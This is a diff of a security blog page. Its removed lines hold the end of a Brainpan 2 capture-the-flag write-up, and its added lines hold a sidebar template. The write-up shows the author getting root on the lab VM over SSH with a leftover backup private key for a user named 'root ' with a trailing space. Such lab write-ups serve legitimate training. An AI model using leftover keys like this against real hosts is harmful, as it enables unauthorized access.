-Warning: Permanently added '[127.0.1.1]:2222' (ECDSA) to the list of known hosts.
-root@127.0.1.1's password:
-</code></pre>
-
-<p>In the .backup folder, there were backups of all the files in the home folder for &lsquo;puck&rsquo;. However, when I was reading through them, I noticed that the .id_rsa keys were not the same between his live files, and backup files.</p>
-
-<pre><code>puck@brainpan2:~$ diff -q ~/.ssh/id_rsa ~/.backup/.ssh/id_rsa
-Files /home/puck/.ssh/id_rsa and /home/puck/.backup/.ssh/id_rsa differ
-</code></pre>
-
-<p>I tried using this backup key to ssh as root, and it worked!</p>
-
-<pre><code>puck@brainpan2:~$ ssh -l &quot;root &quot; brainpan2 -p2222 -i ~/.backup/.ssh/id_rsa
-Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Thu Nov  7 11:00:06 2013
-root @brainpan2:~# id
-uid=0(root ) gid=0(root ) groups=0(root )
-</code></pre>
-
-<p>I was actually the &lsquo;root &rsquo; (with a space) user this time. I then read the &lsquo;flag.txt&rsquo; file, with a grin.</p>
-
-<pre><code>root @brainpan2:~# cat /root/flag.txt
-
-                          !!! CONGRATULATIONS !!!
-
-                 You've completed the Brainpan 2 challenge!
-                 Or have you...?
-
-                 Yes, you have! Pat yourself on the back. :-)
-
-                 Questions, comments, suggestions for new VM
-                 challenges? Let me know!
-
-
-                 Twitter: @superkojiman
-                 Email  : contact@techorganic.com
-                 Web    : http://www.techorganic.com
-
-</code></pre>
-
-<h2 id="conclusion">Conclusion</h2>
-
-<p>After talking with <a href="https://twitter.com/@superkojiman">superkojiman</a>, I find out that I did at least a couple of the challenges in ways he didn&rsquo;t design. The last part of the challenge was actually supposed to be an exploit-dev challenge, but I managed to find my own path. I may have to return to this challenge to try it the proper way now.</p>
-
-<p>Thanks <a href="https://twitter.com/@superkojiman">superkojiman</a> for an awesome boot2root. Thanks <a href="https://twitter.com/@g0tmi1k">g0tmi1k</a> for hosting <a href="http://vulnhub.com/">VulnHub</a>. I really enjoyed playing this game, and appreciate the work that everyone puts into the individual challenges, as well as the site itself.</p>
-
-        </div>
-        
-      </article>
+      
+      </div>
     </div>
     
-  </div>
+    <div id='sidebar-wrapper'>
+      <div class='sidebar ready-widget section' id='sidebar'>
+        <div class='widget HTML' data-version='1' id='HTML3'>
+	<h2 class='title'>Author</h2>
+	<div class='widget-content'>
+		<div class="sidebar_about_author">
+			<div class="inner_wrapper">
+				<div class="aboutme-img">
+					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
+				</div>
+			</div>
+			<div class="aboutme-info">
+				<h4>Matt Andreko</h4>
+				<p>Security Consultant</p>
+			</div>
+		</div>
+	</div>
+	<div class='clear'></div>
 </div>
+        <div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
+	<h2>Popular Articles</h2>
+	<div class='widget-content popular-posts'>
+		<ul>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>
+							<img alt='LOVE WRITING AND SHARING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>SOME BLOG POST 1</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>
+							<img alt='THE ULTIMATE CONSUMERS' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>SOME BLOG POST 2</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>
+							<img alt='IT IS BEYOND BLOGGING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>SOME BLOG POST 3</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>
+							<img alt='STARBUCKS REPRESENTS SOMETHING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>SOME BLOG POST 4</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+		</ul>
+		<div class='clear'></div>
+	</div>
+</div>
+        <div class='widget HTML' data-version='1' id='HTML2'>
+	<h2 class='title'>Featured</h2>
+	<div class='widget-content'>
+		<span class="labelpost" data-label="Magazine" data-no="4"></span>
+	</div>
+	<div class='clear'></div>
+	<span class='widget-item-control'>
+		<span class='item-control blog-admin'>
+			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
+				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+			</a>
+		</span>
+	</span>
+	<div class='clear'></div>
+</div>
+        <div class='widget Label' data-version='1' id='Label1'>
+	<h2>Categories</h2>
+	<div class='widget-content cloud-label-widget-content'>
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/antivirus'>antivirus</a>
+			</span>
 
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/aslr'>aslr</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/assembly'>assembly</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/brainpan'>brainpan</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/browsers'>browsers</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/burp'>burp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/canon'>canon</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/certification'>certification</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/commandinjection'>commandinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cookies'>cookies</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/csharp'>csharp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ctp'>ctp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cucumber'>cucumber</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/directorytraversal'>directorytraversal</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dos'>dos</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dotnet'>dotnet</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/encoding'>encoding</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exif'>exif</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit'>exploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fail'>fail</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fogbugz'>fogbugz</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/food'>food</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/formatstring'>formatstring</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fusion'>fusion</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/future'>future</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/gac'>gac</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/getoffmylawn'>getoffmylawn</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/greasemonkey'>greasemonkey</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hacking'>hacking</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/heap'>heap</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hexchat'>hexchat</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hover'>hover</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/html'>html</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/http'>http</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/includes'>includes</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/injection'>injection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/iphone'>iphone</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/kioptrix'>kioptrix</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/linux'>linux</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/metasploit'>metasploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/mips'>mips</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/monxla'>monxla</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/natas'>natas</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/nebula'>nebula</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/net'>net</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/offsec'>offsec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/oscp'>oscp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/osx'>osx</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/php'>php</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/printer'>printer</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/projects'>projects</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/protostar'>protostar</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwb'>pwb</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwcrack'>pwcrack</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rails'>rails</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rant'>rant</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2libc'>ret2libc</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2text'>ret2text</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rop'>rop</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rspec'>rspec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/security'>security</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/shellcode'>shellcode</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sprint'>sprint</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sqlinjection'>sqlinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ssh'>ssh</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/suid'>suid</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sysax'>sysax</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/tdd'>tdd</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/testing'>testing</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/til'>til</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ui'>ui</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/userscript'>userscript</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/vim'>vim</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/wargames'>wargames</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/windows'>windows</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xor'>xor</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xss'>xss</a>
+			</span>
+
+		
+		<div class='clear'></div>
+	</div>
+</div>
+      </div>
+    </div>
+    <div style='clear: both;'></div>
+  </div>
+
+
+
+
+
+		</div>
 		
 		<div id='w2t_footer'>
 			<div class='w2t-copy-container row'>
